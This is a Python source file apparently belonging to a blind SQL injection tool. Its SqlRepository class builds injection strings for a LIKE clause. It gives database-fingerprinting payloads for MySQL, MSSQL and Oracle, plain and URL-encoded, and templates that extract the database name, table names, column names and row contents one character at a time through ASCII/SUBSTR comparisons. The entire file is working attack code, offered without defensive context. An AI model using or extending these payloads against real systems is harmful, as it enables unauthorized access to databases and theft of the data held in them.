class SqlRepository:
    def __init__(self):
        self.db_type_queries = {
                    "MYSQL": {
                        "text": "자%' and (SELECT 1 FROM information_schema.tables LIMIT 0,1) and 'j%'='j",
                        "encoded": "%EC%9E%90%25%27%20and%20%28SELECT%201%20FROM%20information_schema.tables%20LIMIT%200%2C1%29%20and%20%27j%25%27%3D%27j"
                    },
                    "MSSQL": {
                        "text": "자%' and (SELECT TOP 1 1 FROM master..sysdatabases) and 'j%'='j",
                        "encoded": "%EC%9E%90%25%27%20and%201%3D%28SELECT%20TOP%201%201%20FROM%20master..sysdatabases%29%20and%20%27j%25%27%3D%27j"
                    },
                    "ORACLE": {
                        "text": "자%' and (SELECT 1 FROM all_objects WHERE ROWNUM=1) and 'j%'='j",
                        "encoded": "%EC%9E%90%25%27%20and%201%3D%28SELECT%201%20FROM%20all_objects%20WHERE%20ROWNUM%3D1%29%20and%20%27j%25%27%3D%27j"
                    }
                }
    
    def getTypeQueries(self):
        return self.db_type_queries
    
    def getDBNumQueries(self, length_num):
        return f"자%' and (SELECT LENGTH(DATABASE()) > {length_num}) and 'j%'='j"
    
    def getDBNameQueries(self, idx, value):
        return f"자%' and (SELECT ASCII(SUBSTR(DATABASE(), {idx}, 1)) > {value}) and 'j%'='j"
    
    def getTableNumQueries(self, db_name, length_num):
        return f"자%' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}') > {length_num} AND 'j%'='j"
    
    def getTableNameLengthQueries(self, db_name, table_idx, length_num):
        return f"자%' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_idx},1) > {length_num} AND 'j%'='j"

    def getTableNameQueries(self, db_name, table_idx, char_idx, ascii_value):
        return f"자%' AND (SELECT ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_idx}, 1), {char_idx}, 1)) > {ascii_value}) AND 'j%'='j"
    
    def getColumnNumQueries(self, db_name, table_name, length_num):
        return f"자%' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}') > {length_num} AND 'j%'='j"
    
    def getColumnNameLengthQueries(self, db_name, table_name, column_idx, length_num):
        return f"자%' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {column_idx},1) > {length_num} AND 'j%'='j"
    
    def getColumnNameQueries(self, db_name, table_name, column_idx, char_idx, ascii_value):
        return f"자%' AND (SELECT ASCII(SUBSTR((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {column_idx}, 1), {char_idx}, 1)) > {ascii_value}) AND 'j%'='j"
    
    def getDataNumQueries(self, table_name, length_num):
        return f"자%' AND (SELECT COUNT(*) FROM {table_name}) > {length_num} AND 'j%'='j"

    def getDataLengthQueries(self, table_name, column_name, row_idx, length_num):
        return f"자%' AND (SELECT LENGTH({column_name}) FROM {table_name} LIMIT {row_idx},1) > {length_num} AND 'j%'='j"
    
    def getDataQueries(self, table_name, column_name, row_idx, char_idx, ascii_value):
        return f"자%' AND (SELECT ASCII(SUBSTR((SELECT {column_name} FROM {table_name} LIMIT {row_idx},1), {char_idx}, 1)) > {ascii_value}) AND 'j%'='j"
    